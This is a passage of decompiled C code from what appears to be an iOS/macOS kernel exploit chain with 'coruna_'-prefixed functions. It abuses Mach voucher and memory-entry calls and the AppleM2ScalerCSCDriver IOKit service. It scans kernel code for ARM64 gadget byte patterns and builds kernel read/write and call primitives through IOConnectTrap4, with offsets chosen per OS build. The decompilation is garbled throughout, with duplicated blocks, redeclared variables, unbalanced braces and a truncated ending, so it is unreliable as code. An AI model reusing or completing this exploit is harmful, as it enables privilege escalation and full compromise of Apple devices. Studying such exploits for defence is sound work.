  err = coruna_voucher_create(val,(arg & 0xffffffff) + 0x1122334455667788,&scratch);
  name = scratch;
  if (err == 0) {
    name = 0;
    size = 0x1001;
  }
  else {
    if (arg_x_x == (vm_address_t *)0x0) {
      size = 0;
      if (1 < name + 1) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
      }
      return size;
    }
    u = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,arg_x_x,arg_x,0,1,scratch,0,0,3,2,
                    unaff_w22);
    size = 0;
    if (u != 0) {
      size = u | 0x80000000;
    }
    if (1 < name + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
    }
    return size;
  }
  if ((arg_x_x != (vm_address_t *)0x0) && (*arg_x_x != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,*arg_x_x,arg_x);
    *arg_x_x = 0;
  }
fail:
  if (1 < name + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,name);
  }
  return size;
}





uint64_t coruna_kernel29bb0_via_mach_port_deallocate_eb24(long handle)
{
  uint64_t u;
  uint64_t size;
  uint64_t scratch;
  
  scratch = 0;
  size = *(uint64_t *)k_kernel_vm_page_size_slot;
  if ((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) {
    u = coruna_mach_port_deallocate_eb24(handle,0x10,size,&scratch);
    if ((int)u == 0) {
      *(uint64_t *)(handle + 0x118) = scratch;
      *(uint64_t *)(handle + 0x120) = size;
    }
  }
  else {
    u = 0;
  }
  return u;
}





uint64_t coruna_mach_port_deallocate_11a7c(long handle,uint32_t *size)
{
  uint8_t *ptr;
  int err;
  uint u;
  unsigned long size;
  uint32_t version;
  uint *buf;
  long handle;
  mach_port_name_t *lpm8;
  unsigned long port;
  stat scratch;
  uint32_t bootargs;
  uint thread_attr [4];
  mach_port_name_t host_info [4];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  host_info[0] = 0;
  host_info[1] = 0;
  host_info[2] = 0;
  host_info[3] = 0;
  thread_attr[0] = 0xffffffff;
  thread_attr[1] = 0xffffffff;
  thread_attr[2] = 0xffffffff;
  thread_attr[3] = 0xffffffff;
  bootargs = 0xffffffff;
  u = 3;
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    u = 4;
  }
  port = (unsigned long)u;
  err = coruna_open_dev_null(&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if (err == 0) {
    handle = 0x1122334455667788;
    lpm8 = host_info;
    buf = thread_attr;
    size = port;
    do {
      err = coruna_voucher_create(handle,handle,lpm8);
      coruna_close(bootargs);
      }
      buf = thread_attr;
      do {
      u = *buf;
      if (u != 0xffffffff) {
      u = _close(u);
      }
      size = (unsigned long)u;
      buf = buf + 1;
      port = port - 1;
      } while (port != 0);
      version = 0;
      done:
      *size = version;
      if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
      return 1;
      }
      buf = thread_attr;
      do {
      u = *buf;
      if (u != 0xffffffff) {
      u = _close(u);
      }
      size = (unsigned long)u;
      buf = buf + 1;
      port = port - 1;
      } while (port != 0);
      version = 0;
      done:
      *size = version;
      if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
      return 1;
    } while (size != 0);
    err = coruna_call_fcntl(thread_attr);
    if (err == 0) {
      *(uint *)(&k_kernel_slot_1930 + handle) = thread_attr[0];
      *(uint *)(&k_kernel_slot_1934 + handle) = thread_attr[1];
      if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
        *(uint *)(&k_kernel_slot_1938 + handle) = thread_attr[2];
        *(uint *)(&k_kernel_slot_193c + handle) = thread_attr[3];
      }
      else {
        *(uint *)(&k_kernel_slot_1940 + handle) = thread_attr[2];
      }
      err = _fstat(thread_attr[1],&scratch);
      if (err == 0) {
        handle = coruna_ptr_canonicalize(handle,scratch.st_atimespec.tv_sec);
        if (handle != 0) {
          *(__darwin_time_t *)(&k_kernel_slot_19d0 + handle) = scratch.st_atimespec.tv_sec;
        }
        if (0x1f52ffffffffff < *(unsigned long *)(handle + 0x158)) {
          port = scratch.st_atimespec.tv_nsec | 0xffffff0000000000;
          handle = coruna_ptr_canonicalize(handle,port);
          if (handle != 0) {
            *(unsigned long *)(handle + 0x218) = port;
          }
          scratch.st_atimespec.tv_nsec =
               ((unsigned long)scratch.st_atimespec.tv_nsec >> 0x28) * (unsigned long)*(uint *)(handle + 0x180);
        }
        if ((scratch.st_atimespec.tv_nsec != 0) &&
           ((*(unsigned long *)(handle + 0x188) & scratch.st_atimespec.tv_nsec) == 0)) {
          *(long *)(&k_kernel_slot_19e0 + handle) = scratch.st_atimespec.tv_nsec;
        }
      }
      coruna_fd_drain(&k_kernel_slot_1930 + handle);
      size = coruna_close(bootargs);
      version = 1;
      *size = version;
      if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
      return 1;
      }
      ___stack_chk_fail(size);
    }
fail:
    coruna_close(bootargs);
  }
  buf = thread_attr;
  do {
    u = *buf;
    if (u != 0xffffffff) {
      u = _close(u);
    }
    size = (unsigned long)u;
    buf = buf + 1;
    port = port - 1;
  } while (port != 0);
  version = 0;
done:
  *size = version;
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return 1;
  }
  ___stack_chk_fail(size);
}





unsigned long coruna_mach_port_destroy_11ca4(long arg,long val)

{
  long off;
  int err;
  kern_return_t lk3;
  unsigned long size;
  long serial_10;
  long base;
  uint64_t scratch;
  long stack_guard;
  uint serial_buf;
  uint8_t bootargs[4];
  long sa_saved;
  mach_port_name_t sa_new;
  
  if (val != 0) {
    size = coruna_voucher_create(arg,0x1122334455667788,&sa_new);
    if ((int)size == 0) {
      return size;
    }
    serial_10 = coruna_ret_stub_2(arg,sa_new);
    if (serial_10 == 0) {
      return 0;
    }
    size = coruna_kernel29bb0_via_ioconnectcallmethod(arg,serial_10,&serial_buf);
    if ((int)size == 0) {
      return size;
    }
    if ((serial_buf & 0x3ff) == 2) {
      return 1;
    }
    if (*(int *)(arg + 0x140) == 0x1809) {
      err = coruna_ctx_test_flag(arg,0x5584001);
      off = 0x3c8;
      if (err != 0) {
        off = 0x3d0;
      }
      base = coruna_kernel29bb0_via_return_zero_1f078(arg,sa_new);
      if (base == 0) {
        return 0;
      }
      err = coruna_kernel29bb0_trampoline_0001a670(arg,base + 0x38,&sa_saved);
      if (err == 0) {
        return 0;
      }
      if (serial_10 != sa_saved) {
        return 0;
      }
      size = coruna_kernel29bb0_via_ioconnectcallmethod(arg,base + 8,bootargs);
      if ((int)size == 0) {
        return size;
      }
      size = coruna_mach_vm_machine_attribute(arg,base + 8,0xffff);
      if ((int)size == 0) {
        return size;
      }
      lk3 = _mach_port_destroy(*(ipc_space_t *)k_kernel_mach_task_self_slot,sa_new);
      if (lk3 == 0) {
        size = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(arg,base + 0x38,val);
        if ((int)size == 0) {
          return size;
        }
        coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(arg,val);
        serial_10 = coruna_kernel29bb0_via_return_zero_1f078(arg,*(uint32_t *)(&k_kernel_slot_1918 + arg));
        if (serial_10 == 0) {
          return 0;
        }
        stack_guard = val;
        size = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,serial_10 + off,&stack_guard,8);
        if ((int)size == 0) {
          return size;
        }
        scratch = *(uint64_t *)(&k_kernel_slot_19e0 + arg);
        err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(arg,serial_10 + off + 8,&scratch,8);
        return (unsigned long)(err != 0);
      }
    }
  }
  return 0;
}





uint64_t coruna_mach_port_deallocate_132e8(long handle,mach_port_name_t *arg,uint64_t val)
{
  int err;
  kern_return_t lk2;
  long handle;
  uint64_t u;
  long addr;
  long off;
  uint scratch;
  uint8_t bootargs[4];
  long thread_attr;
  
  err = *(int *)(handle + 0x140);
  off = 0x38;
  if (err < 0x1f53) {
    if (err != 0x1809 && err != 0x1c1b) {
      return 0;
    }
  }
  else if (1 < err - 0x1f53U) {
    if (err != 0x2258) {
      return 0;
    }
    off = 0x30;
  }
  handle = coruna_ret_stub_2(handle,*arg);
  if (handle == 0) {
    return 0;
  }
  u = coruna_kernel29bb0_via_ioconnectcallmethod(handle,handle,&scratch);
  if ((int)u == 0) {
    return u;
  }
  if ((scratch & 0x3ff) == 0x25) {
    addr = coruna_return_zero_1f078(handle,handle);
    if (addr == 0) {
      return 0;
    }
    err = coruna_kernel29bb0_trampoline_0001a670(handle,addr + off,&thread_attr);
    if (err == 0) {
      return 0;
    }
    if (handle != thread_attr) {
      return 0;
    }
    u = coruna_kernel29bb0_via_ioconnectcallmethod(handle,addr + 8,bootargs);
    if ((int)u == 0) {
      return u;
    }
    u = coruna_mach_vm_machine_attribute(handle,addr + 8,0xffff);
    if ((int)u == 0) {
      return u;
    }
    lk2 = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,*arg);
    if (lk2 == 0) {
      *arg = 0;
      handle = coruna_ret_stub_2(handle,val);
      if (handle == 0) {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(handle,addr + off,handle);
      if ((int)u == 0) {
        return u;
      }
      coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_ioconnectcallmethod_3(handle,handle);
      return 1;
    }
  }
  return 0;
}





uint32_t coruna_mach_port_deallocate_281f0(uint64_t val,unsigned long arg,uint64_t id_2)
{
  int err;
  uint32_t u;
  mach_port_name_t scratch;
  
  scratch = 0;
  err = coruna_voucher_create(val,(arg & 0xffffffff) + 0x1122334455667788,&scratch);
  u = 0x1001;
  if (err != 0) {
    err = coruna_mach_port_deallocate_132e8(val,&scratch,id_2);
    u = 0x1001;
    if (err != 0) {
      u = 0;
    }
  }
  if (1 < scratch + 1) {
    _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
  }
  return u;
}





uint64_t coruna_helper_10384_12098(void)
{
  return 0;
}





unsigned long coruna_mach_make_memory_entry(uint64_t arg,uint64_t val,size_t n,vm_offset_t m,
                  vm_address_t *p)

{
  uint8_t *ptr;
  bool flags;
  uint u;
  unsigned long size;
  vm_inherit_t in_stack_ffffffffffffff90;
  size_t scratch;
  mem_entry_name_port_t host_info;
  vm_offset_t serial_buf;
  
  ptr = k_kernel_mach_task_self_slot;
  host_info = 0;
  flags = m == 0;
  scratch = n;
  serial_buf = m;
  if ((m == 0) &&
     (u = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&serial_buf,n,1),
     u != 0)) {
    flags = false;
    size = (unsigned long)(u | 0x80000000);
    if (1 < host_info + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,host_info);
    }
    if (flags) {
    _vm_deallocate(*(vm_map_t *)ptr,serial_buf,n);
    }
    return size;
  }
  u = _mach_make_memory_entry(*(vm_map_t *)ptr,&scratch,serial_buf,3,&host_info,0);
  if (u == 0) {
    if (scratch == n) {
      size = coruna_mach_port_deallocate_281f0(arg,val,host_info);
      if (((int)size == 0) && (m == 0)) {
        u = _vm_map(*(vm_map_t *)ptr,p,n,0,1,host_info,0,0,3,2,
                        in_stack_ffffffffffffff90);
        if (u == 0) {
          _bzero((void *)*p,n);
          size = 0;
          if (1 < host_info + 1) {
          _mach_port_deallocate(*(ipc_space_t *)ptr,host_info);
          }
          if (flags) {
          _vm_deallocate(*(vm_map_t *)ptr,serial_buf,n);
          }
          return size;
        }
        goto retry;
      }
    }
    else {
      size = 0xad022;
    }
  }
  else {
retry:
    size = (unsigned long)(u | 0x80000000);
  }
  if (((int)size != 0 && m == 0) && (*p != 0)) {
    _vm_deallocate(*(vm_map_t *)ptr,*p,n);
  }
next:
  if (1 < host_info + 1) {
    _mach_port_deallocate(*(ipc_space_t *)ptr,host_info);
  }
  if (flags) {
    _vm_deallocate(*(vm_map_t *)ptr,serial_buf,n);
  }
  return size;
}





void coruna_kernel09_via_mach_make_memory_entry(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  uint64_t scratch;
  
  ptr = k_kernel_vm_page_size_slot;
  scratch = 0;
  err = coruna_mach_make_memory_entry((int)handle,0x10,*(uint64_t *)k_kernel_vm_page_size_slot,0,&scratch);
  if (err == 0) {
    u = *(uint64_t *)ptr;
    *(uint64_t *)(handle + 0x118) = scratch;
    *(uint64_t *)(handle + 0x120) = u;
  }
  return;
}





void coruna_mach_port_deallocate_12288(long handle)
{
  uint8_t *ptr;
  int err;
  uint64_t u;
  long handle;
  unsigned long size;
  long addr;
  long off;
  long base;
  long scratch;
  mach_port_name_t bootargs;
  uint thread_attr;
  int host_info [4];
  uint32_t serial_buf[4];
  long action;
  
  action = *(long *)k_kernel_stack_chk_guard_slot;
  off = 0x1122334455667788;
  u = coruna_voucher_create(handle,0x1122334455667788,serial_buf);
  if ((((int)u != 0) && (handle = coruna_ret_stub_2(handle,serial_buf[0]), u = 0, handle != 0)) &&
     (u = coruna_kernel29bb0_via_ioconnectcallmethod(handle,handle,&thread_attr), ptr = k_kernel_mach_task_self_slot,
     (int)u != 0)) {
    if ((thread_attr & 0x3ff) != 0x22) {
      u = 0;
      host_info[0] = *(int *)(&k_kernel_slot_1930 + handle);
      host_info[1] = *(int *)(&k_kernel_slot_1934 + handle);
      if (*(long *)k_kernel_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(u);
    }
    u = 1;
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t
void coruna_open_m2scaler_124f4(uint64_t val,uint64_t id_2,long handle,uint64_t size_3,
            uint64_t off_4,uint64_t off_5,unsigned long *arg)
{
  long handle;
  uint u;
  uint size;
  int err;
  long addr;
  long off;
  uint64_t version;
  uint64_t port;
  long base;
  unsigned long tag;
  uint8_t tag[16];
  int scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t host_info;
  int serial_buf;
  uint64_t action;
  uint64_t bootargs;
  uint64_t block_ctx;
  long stack_guard;
  
  tag = (*(void (*)k_kernel_chkstk_darwin_slot)();
  addr = tag;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  serial_buf = 0;
  bootargs = 0;
  u = *(uint *)(addr + 0x180);
  size = 0;
  if (u != 0) {
    size = 0x1000 / u;
  }
  err = 0x1000 - size * u;
  scratch = 0x1000;
  if (err != 0) {
    scratch = (u - err) + 0x1000;
  }
  if (*(long *)(addr + 0x200) == 0) {
    coruna_macho_text_sect(&action,*(uint64_t *)(&k_kernel_slot_19f8 + addr));
    scratch = bootargs;
    thread_attr = action;
    host_info = block_ctx;
    off = coruna_strsep(&action,"00 00 01 91 C0 03 5F D6",0,0);
    if (off == 0) {
      version = 0;
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
    }
    *(long *)(addr + 0x200) = off;
  }
  version = _IOServiceMatching("AppleM2ScalerCSCDriver");
  port = _IOServiceGetMatchingService(*(uint32_t *)k_kernel_kiomasterportdefault_slot,version);
  u = (int)port + 1;
  if (u < 2) {
done:
    version = 0;
  }
  else {
    err = _IOServiceOpen(port,*(uint32_t *)k_kernel_mach_task_self_slot,0,&serial_buf);
    version = 0;
    if (err == 0) {
      if (serial_buf + 1U < 2) goto done;
      off = coruna_kernel29bb0_via_return_zero_1f078(addr);
      version = 0;
      if (1 < serial_buf + 1U) {
      _IOServiceClose();
      }
      if (1 < u) {
      _IOObjectRelease(port);
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
      return version;
      }
      ___stack_chk_fail();
      err = coruna_kernel29bb0_trampoline_0001a670(addr,off,&bootargs);
      if (((err == 0) || (base = coruna_ptr_canonicalize(addr,bootargs), base == 0)) ||
         (base = coruna_mach_port_allocate_2248c(addr,&scratch), base == 0)) goto done;
      err = coruna_call_mach_vm_machine_attribute_29df8_18d98(addr,bootargs,0x1000,&action);
      if ((err == 0) || (err = coruna_call_mach_vm_machine_attribute_29df8_1aa94(addr,base,&action,0x1000), err == 0)) {
check_ok:
        version = 0;
      }
      else {
        handle = 0x5c0;
        if (*(int *)(addr + 0x140) < 0x1809) {
          handle = 0x5b8;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,handle + base,*(uint64_t *)(addr + 0x200));
        if (err == 0) goto check_ok;
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off,base);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x40,8);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x48,tag);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x50,handle * 2 + -0x10);
        tag = _IOConnectTrap4(serial_buf,0,size_3,off_4,off_5,0);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x40,0);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x48,0);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off + 0x50,0);
        coruna_call_mach_vm_machine_attribute_29df8_1aa8c(addr,off,bootargs);
        if (arg != (unsigned long *)0x0) {
          *arg = tag & 0xffffffff;
        }
        version = 1;
      }
      coruna_mach_port_allocate(addr,base,scratch);
    }
  }
cleanup:
  if (1 < serial_buf + 1U) {
    _IOServiceClose();
  }
  if (1 < u) {
    _IOObjectRelease(port);
  }
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
    return version;
  }
  ___stack_chk_fail();
}





void coruna_strsep(uint64_t *val,char *path,uint32_t size,uint32_t flags_2)
{
  int err;
  char *ptr;
  char *buf;
  long handle;
  uint64_t u;
  long addr;
  long off;
  char *scratch;
  uint64_t scratch;
  uint64_t bootargs;
  char *thread_attr;
  ushort host_info [128];
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  thread_attr = (char *)0x0;
  u = 0;
  if ((path != (char *)0x0) && (ptr = _strdup(path), ptr != (char *)0x0)) {
    addr = 0;
    off = 0;
    scratch = ptr;
    do {
      buf = _strsep(&scratch," ");
      err = _strcmp(buf,"-");
      handle = addr;
      if (err != 0) {
        err = _strcmp(buf,"+");
        if (err != 0) {
          err = _strcmp(buf,"..");
          if (err == 0) {
            host_info[addr] = 0xffff;
            if (addr < 0x7f) {
              addr = addr + 1;
              handle = off;
            }
          }
          else {
            handle = _strtol(buf,&thread_attr,0x10);
            host_info[addr] = (ushort)handle & 0xff;
            if (*thread_attr == '\0') {
              if (addr < 0x7f) {
                addr = addr + 1;
                handle = off;
              }
            }
            else {
              _free(ptr);
              u = 0;
              if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
                ___stack_chk_fail(u);
              }
              return;
            }
          }
        }
        else {
          handle = addr + 1;
        }
      }
      off = handle;
    } while (scratch != (char *)0x0);
    _free(ptr);
    scratch = val[1];
    scratch = (char *)*val;
    bootargs = val[2];
    u = coruna_kernel29bb0_via_cat(&scratch,host_info,addr,handle,size,flags_2);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != serial_buf) {
    ___stack_chk_fail(u);
  }
  return;
}
void coruna_kernel29bb0_via_cat(long *handle,long addr_2,unsigned long arg,long off_3,int flags)
{
  unsigned long u;
  byte *ptr;
  int err;
  char err;
  ushort size;
  byte *buf;
  uint version;
  byte *str;
  byte err;
  long handle;
  char status;
  unsigned long port;
  byte *copy;
  short *lps14;
  byte *data;
  uint8_t kind[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t block_ctx;
  uint64_t sa_new;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t stack_guard;
  uint64_t region;
  uint64_t plist;
  uint64_t url_buf;
  uint64_t sa_saved;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t work;
  uint64_t sa_new;
  uint64_t cache;
  uint64_t cache_20;
  uint64_t cache_21;
  uint64_t path_buf;
  uint64_t cache_22;
  uint64_t cache_23;
  uint64_t cache_24;
  long tmp_buf;
  
  tmp_buf = *(long *)k_kernel_stack_chk_guard_slot;
  version = (uint)arg;
  err = (char)arg;
  if (((arg == (long)err) && (handle[2] != 0)) && (handle[1] != 0)) {
    port = arg;
    if (0 < (int)version) {
      u = ((unsigned long)-version | 0xffffffff00000000) + arg;
      handle = (arg & 0xffffffff) + 1;
      do {
        version = version - 1;
        port = arg;
        if (*(short *)(addr_2 + (unsigned long)version * 2) != -1) break;
        arg = arg - 1;
        handle = handle + -1;
        port = u;
      } while (1 < handle);
    }
    path_buf = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_22 = coruna_cat(err,coruna_cat(err,coruna_cat(err,coruna_u64_pack14((err), (coruna_cat(err,coruna_cat(
                                                  err,coruna_cat(err,err))))))));
    cache_24 = cache_22;
    cache_23 = path_buf;
    cache = cache_22;
    sa_new = path_buf;
    cache_21 = cache_22;
    cache_20 = path_buf;
    json_buf = cache_22;
    sa_saved = path_buf;
    work = cache_22;
    frame = path_buf;
    region = cache_22;
    stack_guard = path_buf;
    url_buf = cache_22;
    plist = path_buf;
    sa_new = cache_22;
    block_ctx = path_buf;
    tmp_buf = cache_22;
    path_buf = path_buf;
    block_ctx = cache_22;
    action = path_buf;
    sa_saved = cache_22;
    stack_guard = path_buf;
    host_info = cache_22;
    serial_buf = path_buf;
    action = cache_22;
    serial_buf = path_buf;
    scratch = cache_22;
    host_info = path_buf;
    thread_attr = cache_22;
    bootargs = path_buf;
    if (1 < err) {
      err = 0;
      do {
        handle = (long)*(short *)(addr_2 + (long)(char)err * 2);
        status = ~err + err;
        if (handle == -1) {
          path_buf = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(status
                                                  ,coruna_cat(status,coruna_cat(status,status))))))));
          cache_22 = coruna_cat(status,coruna_cat(status,coruna_cat(status,coruna_u64_pack14((status), (coruna_cat(
                                                  status,coruna_cat(status,coruna_cat(status,status))))))
                                              ));
          cache_24 = cache_22;
          cache_23 = path_buf;
          cache = cache_22;
          sa_new = path_buf;
          cache_21 = cache_22;
          cache_20 = path_buf;
          json_buf = cache_22;
          sa_saved = path_buf;
          work = cache_22;
          frame = path_buf;
          region = cache_22;
          stack_guard = path_buf;
          url_buf = cache_22;
          plist = path_buf;
          sa_new = cache_22;
          block_ctx = path_buf;
          tmp_buf = cache_22;
          path_buf = path_buf;
          block_ctx = cache_22;
          action = path_buf;
          sa_saved = cache_22;
          stack_guard = path_buf;
          host_info = cache_22;
          serial_buf = path_buf;
          action = cache_22;
          serial_buf = path_buf;
          scratch = cache_22;
          host_info = path_buf;
          thread_attr = cache_22;
          bootargs = path_buf;
        }
        else {
          *(char *)((long)&host_info + handle) = status;
        }
        err = err + 1;
      } while ((int)(char)err < err + -1);
    }
    lps14 = (short *)(addr_2 + port * 2 + -2);
    handle = (long)*lps14;
    err = *(char *)((long)&host_info + handle);
    *(uint8_t *)((long)&host_info + handle) = 0;
    bootargs = handle[1];
    scratch = *handle;
    thread_attr = handle[2];
    kind = coruna_kernel29bb0_residual_162(&scratch,1);
    handle = kind;
    buf = (byte *)0x0;
    if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
    }
    return;
  }
done:
  buf = (byte *)0x0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail(buf);
  }
  return;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_cat(uint64_t *val,char *path,uint64_t id_2,unsigned long arg)
{
  long handle;
  bool err;
  size_t ls3;
  uint16_t *ptr;
  uint64_t u;
  unsigned long size;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  ls3 = _strlen(path);
  ptr = _malloc((ls3 + 2) * 2);
  if (ptr == (uint16_t *)0x0) {
    u = 0;
  }
  else {
    ptr[ls3 + 1] = 0;
    *ptr = 0;
    if (ls3 != 0) {
      size = 0;
      version = 1;
      do {
        ptr[version] = (ushort)(byte)path[size];
        err = version < ls3;
        size = version;
        version = (unsigned long)((int)version + 1);
      } while (err);
    }
    err = (arg & 0x20) != 0;
    handle = ls3 + 1;
    if (err) {
      handle = ls3 + 2;
    }
    scratch = val[1];
    scratch = *val;
    bootargs = val[2];
    u = coruna_kernel29bb0_via_cat(&scratch,ptr + (((uint)arg & 0x20) >> 5 ^ 1),handle,err,id_2,
                         arg);
    _free(ptr);
  }
  return u;
}





long coruna_kernel29bb0_via_call_mach_vm_machine_attribute_29df8(long *handle,uint64_t val,int flags)
{
  unsigned long u;
  int err;
  unsigned long size;
  void *ptr;
  unsigned long version;
  uint8_t version[16];
  long scratch;
  long bootargs;
  long thread_attr;
  uint64_t scratch;
  unsigned long port;
  
  bootargs = handle[1];
  scratch = *handle;
  thread_attr = handle[2];
  scratch = val;
  version = coruna_kernel29bb0_residual_162(&scratch,1);
  port = version;
  if ((port != 0) && (version != 0)) {
    u = port + version;
    size = (unsigned long)*(byte *)(*handle + 0x34);
    if (port + size <= u) {
      version = port;
      do {
        ptr = version;
        if ((flags == 0) || ((version & (long)(flags + -1)) == 0)) {
          coruna_call_mach_vm_machine_attribute_29df8(*handle,ptr,size,version);
          err = _memcmp(ptr,&scratch,size);
          if (err == 0) {
            return (handle[1] - port) + version;
          }
        }
        version = version + 1;
        version = version + -1;
        version = (long)ptr + 1;
      } while ((long)ptr + 1 + size <= u);
    }
  }
  return 0;
}





void coruna_kernel29bb0_via_strsep(long handle)
{
  char *ptr;
  char *buf;
  int err;
  uint u;
  long handle;
  long addr;
  unsigned long size;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  uint8_t thread_attr[24];
  
  err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),8);
  if (err == 0) {
    if ((*(unsigned long *)(handle + 0x88) < 0x22581401900000) ||
       (err = coruna_ctx_test_flag(*(uint64_t *)(handle + 0x118),0x2000), err != 0)) {
      u = coruna_iosurface_gen_index(handle);
      coruna_macho_text_sect(scratch,handle);
      ptr = ".. 01 .. 8B 88 D0 38 D5 E8 00 00 B5";
      if (u != 1) {
        ptr = (char *)0x0;
      }
      buf = "6B FD 62 D3 7F 19 00 F1 .. .. .. 54";
      if (u < 2) {
        buf = ptr;
      }
      ptr = ".. FD .. D3 .. .. 00 F1 .. .. .. 54";
      if (u < 5) {
        ptr = buf;
      }
      addr = coruna_strsep(scratch,ptr,0,1);
      handle = 0xc;
      if (u < 2) {
        handle = -8;
      }
      if (addr == 0) {
        return;
      }
      size = addr + handle;
    }
    else {
      coruna_macho_text_sect(bootargs,handle);
      handle = coruna_strsep(bootargs,".. FD .. D3 .. 00 00 B5",0,1);
      if (handle == 0) {
        return;
      }
      size = handle + 8;
    }
  }
  else {
    coruna_macho_text_sect(thread_attr,handle);
    handle = coruna_strsep(thread_attr,"08 FD 64 D3 1F 21 00 F1 .. 00 00 54",0,1);
    if (handle == 0) {
      return;
    }
    size = handle + 0xc;
  }
  coruna_return_zero_1555c(handle,size & 0xfffffffffffffffc,1);
  return;
}





uint64_t coruna_iosurface_gen_index(long handle)
{
  int err;
  
  err = *(int *)(handle + 0x70);
  if (err < 0x2258) {
    if (err - 0x1f53U < 2) {
      return 4;
    }
    if (err == 0x1809) {
      return 2;
    }
    if (err == 0x1c1b) {
      return 3;
    }
  }
  else {
    if (err == 0x2258 || err == 0x225c) {
      return 5;
    }
    if (err == 0x2712) {
      return 6;
    }
  }
  return 0;
}





void coruna_find_mod_init_func(uint64_t val)
{
  char *ptr;
  char *buf;
  uint u;
  unsigned long size;
  long handle;
  uint64_t scratch;
  unsigned long scratch;
  long bootargs;
  uint8_t thread_attr[8];
  long host_info;
  long serial_buf;
  uint64_t action;
  unsigned long bootargs;
  long block_ctx;
  
  u = coruna_iosurface_gen_index();
  coruna_macho_text_sect(&action,val);
  coruna_macho_map_segsect(thread_attr,val,"__DATA_CONST","__mod_init_func");
  if ((((host_info != 0 && serial_buf != 0) && (size = coruna_kernel29bb0_trampoline_00010cac(val), size != 0)) &&
      (bootargs < size)) && (size < block_ctx + bootargs)) {
    block_ctx = (bootargs - size) + block_ctx;
    bootargs = size;
  }
  ptr = "68 72 40 B9 08 01 19 32 68 72 00 B9";
  if (u != 1) {
    ptr = (char *)0x0;
  }
  buf = "68 82 40 B9 08 01 19 32 68 82 00 B9";
  if (u < 2) {
    buf = ptr;
  }
  scratch = bootargs;
  scratch = action;
  bootargs = block_ctx;
  handle = coruna_strsep(&scratch,buf,0,1);
  if ((handle != 0) &&
     (handle = coruna_return_zero_1555c(val,handle + 0xcU & 0xfffffffffffffffc,1), handle != 0)) {
    coruna_kernel29bb0_trampoline_00010cac(val,handle);
  }
  return;
}





uint64_t coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_nop_stub(uint64_t val)
{
  uint u;
  long handle;
  unsigned long size;
  uint64_t version;
  unsigned long port;
  uint8_t scratch[24];
  
  coruna_macho_text_sect(scratch);
  handle = coruna_strsep(scratch,"E0 03 15 AA .. .. .. .. FE 03 13 AA",0,1);
  if ((handle != 0) && (handle = coruna_kernel29bb0_via_kernel29bb0_via_kernel29bb0_via_nop_stub_2(val,handle + 4), handle != 0)) {
    port = 0xfffffffffffffffc;
